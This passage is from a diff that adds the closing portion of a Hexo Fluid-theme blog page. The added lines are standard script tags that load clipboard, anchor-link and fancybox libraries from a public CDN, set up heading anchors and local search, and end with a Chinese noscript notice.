+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
